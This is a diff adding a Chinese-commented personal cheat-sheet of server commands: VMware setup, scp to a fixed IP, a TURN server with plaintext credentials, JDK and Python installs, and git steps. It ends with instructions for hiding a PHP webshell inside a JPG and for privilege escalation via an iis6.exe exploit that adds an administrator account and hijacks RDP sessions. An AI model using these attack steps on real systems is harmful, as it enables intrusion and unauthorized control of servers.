@@ -1,0 +1,29 @@
+//搭建虚拟化主机
+vsphere+vcenter+exsi+iscsi
+//清除密钥信息
+ssh-keygen -R 39.106.43.245
+//上传文件
+scp go1.9.4.linux-amd64.tar.gz root@39.106.43.245:/usr/local/go
+//启动turn服务
+turnserver -o -a -f -v --mobility -m 10 --max-bps=100000 --min-port=32355 --max-port=65535 --user=ling:ling1234 --user=ling2:ling1234 -r demo
+//获取jdk
+wget --no-check-certificate --no-cookies --header "Cookie: oraclelicense=accept-securebackup-cookie" https://download.oracle.com/otn-pub/java/jdk/8u201-b09/42970487e3af4f5aa5bca3f542482c60/jdk-8u201-linux-x64.tar.gz
+//更新Ubuntu自带python
+add-apt-repository ppa:jonathonf/python-2.7
+apt-get update
+apt-get install python2.7
+//提交项目到github
+git init
+git add .
+git commit -m "说明信息"
+git remote add origin 提交地址
+git push -u origin master
+//制作图片木马
+将lubr.php插入到pic.jpg中，输出PicLubr。
+jpg：copy pic.jpg/b+lubr.php/a PicLubr.jpg
+//提权
+上传cmd和iis
+执行iis6.exe "net user fengye 123454321 /add"添加用户
+执行iis6.exe "net localgroup Administrators fengye /add"添加到system用户组
+执行tasklist -svc查看服务 找到远程桌面服务termservice的pid 根据端口号登陆
+iis6.exe "query user" 查询当前登陆用户 iis6.exe "logoff 3" 根据id注销掉
